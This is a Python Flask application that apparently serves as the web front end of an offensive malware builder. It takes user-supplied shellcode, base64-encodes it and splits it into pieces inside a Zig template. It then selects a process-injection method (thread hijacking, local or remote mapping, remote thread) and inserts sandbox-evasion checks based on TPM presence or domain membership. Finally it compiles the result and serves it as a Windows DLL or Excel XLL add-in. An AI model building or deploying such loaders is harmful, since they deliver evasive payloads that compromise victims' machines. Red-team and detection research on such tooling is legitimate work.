from flask import Flask, render_template, request, send_file, jsonify
import base64
import subprocess
import os
import re 
import math

app = Flask(__name__, 
    static_url_path='/static',
    static_folder='static')

def split_base64_string(encoded_content, num_parts=15):
    """Split base64 string into equal parts"""
   
    total_length = len(encoded_content)
    length_per_part = math.ceil(total_length / num_parts)
    

    parts = []
    for i in range(0, total_length, length_per_part):
        parts.append(encoded_content[i:i + length_per_part])
    
  
    while len(parts) < num_parts:
        parts.append("")
    
    return parts

def get_specific_code_block(file_path, block_identifier):
    if not os.path.exists(file_path):
        print(f"Error: File not found - {file_path}")
        return ""

    try:
        with open(file_path, 'r') as file:
            content = file.read()
           
            pattern = rf"// {block_identifier}\s*(.*?)\s*// END OF {block_identifier}"
            match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
            
            if match:
                extracted_block = match.group(1).strip()
            
                return extracted_block
            else:
                print(f"Warning: Block identifier '{block_identifier}' not found in {file_path}")
                return ""
    except Exception as e:
        print(f"Error reading file {file_path}: {str(e)}")
        return ""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try: 
            content = request.form['content']
            extension = request.form['extension']
            injection_method = request.form['injection_method']
            enable_protection = request.form['protection_features']
            process_name = request.form['process_name']
            xll_code = '';
            dll_code = '';
        
        
            encoded_content = base64.b64encode(content.encode()).decode()
            encoded_size = len(encoded_content)
            print(f"Encoded content size: {encoded_size}")
            shellcode_parts = split_base64_string(encoded_content)
        
       
            with open('../src/main.zig', 'r') as f:
                original_zig_code = f.read()
            
            with open('../src/main.zig', 'r') as t:
                zig_code = t.read()
        
            struct_content = "const SH = struct {\n"
            for i, part in enumerate(shellcode_parts, 1):
                struct_content += f'    const b{i} = ComptimeWS("{part}");\n'
            struct_content += "\n    pub fn getshellcodeparts() [15][]const u16 {\n"
            struct_content += "         return .{  b1,  b2,  b3,  b4,  b5,  b6,  b7,  b8,  b9,  b10,  b11,  b12,  b13,  b14,  b15, \n"
            struct_content += "    };\n"
           # struct_content += "}\n"
           # struct_content += "};\n"
            
            # Replace the entire SH struct in the zig code
            zig_code = re.sub(
                r'const SH = struct \{[\s\S]*?\};',
                struct_content,
                zig_code
            )
        
        #with open('../src/parts/ENTRY_DLL', 'r') as f:
        #    dll_code = f.read()

       # with open('../src/parts/ENTRY_XLL', 'r') as f:
       #     xll_code = f.read()

        # lets do some check and compare 
       
        
        # Replace the injection method in DllMain
            if injection_method == 'hijack_thread' and extension == 'xll':
                
                xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'HIJACK THREAD INJECTION')
         
            elif injection_method == 'local_mapping' and extension == 'xll':  # local_mapping
          
                xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'LOCAL MAPPING INJECTION ')
            elif injection_method == 'remote_mapping' and extension == 'xll':
                xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'REMOTE MAPPING INJECTION')
            elif injection_method == 'remote_thread' and extension == 'xll':
                xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'HIJACK REMOTE THREAD INJECTION')
                #xll_code = xll_code.replace('// PROCESS NAME', process_name)
          #  if xll_code != '':
          #      zig_code = zig_code.replace('// ENTRY_XLL', xll_code)


            if injection_method == 'local_mapping' and extension == 'dll':
               dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'LOCAL MAPPING INJECTION')
            elif injection_method  == 'hijack_thread' and extension == 'dll':
               dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'HIJACK THREAD INJECTION')
            elif injection_method == 'remote_mapping' and extension == 'dll':
               dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'REMOTE MAPPING INJECTION')
               #dll_code = dll_code.replace('// PROCESS NAME ', process_name)
            elif injection_method == 'remote_thread' and extension == 'dll':
               dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'HIJACK REMOTE THREAD INJECTION') 
               #dll_code = dll_code.replace('// PROCESS NAME', process_name)
         
            if dll_code != '':
                zig_code = zig_code.replace('// ENTRY_DLL', dll_code)
            if xll_code != '':
                zig_code = zig_code.replace('// ENTRY_XLL', xll_code)
      
            

            if enable_protection == 'tpm_check':
                zig_code = zig_code.replace('// Sandbox protection option enabled? ', 'if (!core.checkTPMPresence()) {\n    std.debug.print("sandbox detected \\n", .{});\n    return 0;\n}')

            if enable_protection == 'domain_check':
                zig_code = zig_code.replace('// Sandbox protection option enabled? ', 'if (!core.checkDomainStatus()) {\n   std.debug.print("sandbox detected \\n", .{});\n      return 0;\n }')

            if process_name != '':
                zig_code = zig_code.replace('// PROCESS NAME ', process_name)
          # Write the modified code back to main.zig
            with open('../src/main.zig', 'w') as f:
                f.write(zig_code)
        
            with open('../src/temp.txt', 'w') as f:
                f.write(zig_code)
        
        # this will compile the zig code and generate the the library. i don't like EXE so do on your own. 
            result = subprocess.run(['zig', 'build', '-Dtarget=x86_64-windows-gnu'], capture_output=True, text=True)
            

            if extension == 'xll':
                os.rename('../zig-out/bin/excel_thread_demo.dll', '../zig-out/bin/output.xll' )
            elif extension == 'dll':
                os.rename('../zig-out/bin/excel_thread_demo.dll', '../zig-out/bin/output.dll')

        
            with open('../src/main.zig', 'w') as f:
                f.write(original_zig_code) 


        
            print(f"Compilation return code: {result.returncode}")
            print(f"Compilation stdout: {result.stdout}")
            print(f"Compilation stderr: {result.stderr}")

            if result.returncode != 0:
                return jsonify({'error': 'Compilation failed......', 'details': result.stderr}), 500
        
        # Locate the compiled file
            output_dir = '../zig-out/bin'
            print(f"Checking output directory: {output_dir}")

            try:
                output_files = os.listdir(output_dir)
                print(f"Files in output directory: {output_files}")
            except Exception as e:
                print(f"Error listing output directory: {str(e)}")
                return jsonify({'error': 'Failed to list output directory', 'details': str(e)}), 500

            compiled_file = next((f for f in output_files if f.endswith(extension)), None)

            if compiled_file:
                output_path = os.path.join(output_dir, compiled_file)
                print(f"Found compiled file: {output_path}")
                try:
                    return send_file(output_path, as_attachment=True, download_name=f'output.{extension}')
                except Exception as e:
                    print(f"Error sending file: {str(e)}")
                    return jsonify({'error': 'Failed to send compiled file', 'details': str(e)}), 500
            else:
                print(f"No file found with extension: {extension}")
                return jsonify({'error': 'Compilation succeeded but file not found'}), 500
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return render_template('index.html')

if __name__ == '__main__':
    
    app.run(debug=True,host='0.0.0.0',port=5002)